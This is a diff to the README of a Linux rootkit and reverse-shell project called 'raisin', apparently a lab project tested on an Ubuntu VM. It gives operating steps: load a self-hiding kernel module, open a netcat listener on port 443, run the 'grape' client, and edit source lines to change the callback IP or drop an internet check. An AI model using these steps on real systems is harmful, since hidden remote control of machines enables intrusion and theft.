@@ -4,7 +4,8 @@
 
 The raisin malware is a combination rootkit and reverse shell application. The raisin malware uses the LKM created by [Maxim Biro](https://www.google.com) to gain root access, grape is a continuously running client that will launch a reverse shell and can then be used to send commands to the LKM.
 
-The rootkit only works on **Linux kernels up to 4.4.0-31** and has architecture-specific code in the rootkit which is implemented only for **x86** and **x86-64** architectures. The raisin malware was tested on a Ubuntu 14.04 VM.
+The rootkit only works on **Linux kernels up to 4.4.0-31** and has architecture-specific code in the rootkit which is implemented only for **x86** and **x86-64** architectures. The raisin malware was tested on a Ubuntu 14.04 VM. The reverse shell IP on the default build
+is set to the VM IP of `10.0.2.15` to change edit line `42` of grape.c.
 
 ## Infection Method
 
@@ -35,7 +36,9 @@ essentials if not already installed `apt-get install build-essential`
 2. Load the rootkit using `sudo insmod rootkit.ko`, the rootkit will hide itself so it can't be seen with `lsmod` till the `unhide` command is given.
 3. Open a listener for the reverse shell using `sudo nc -lvp 443`. On the default
 build target IP is set for default VM IP of `10.0.2.15`.
-4. Start the grape client `./grape`
+4. Start the grape client `./grape`, if no internet access is available grape
+will shutdown. If you wish to remove this simple delete line `74-75` in grape.c
+and recompile.
 5. The reverse shell is now active and can be used to send commands to the host
 machine.
 6. In the `/tmp` directory a pipe is created named `grape_fifo`. Sending `echo -n`
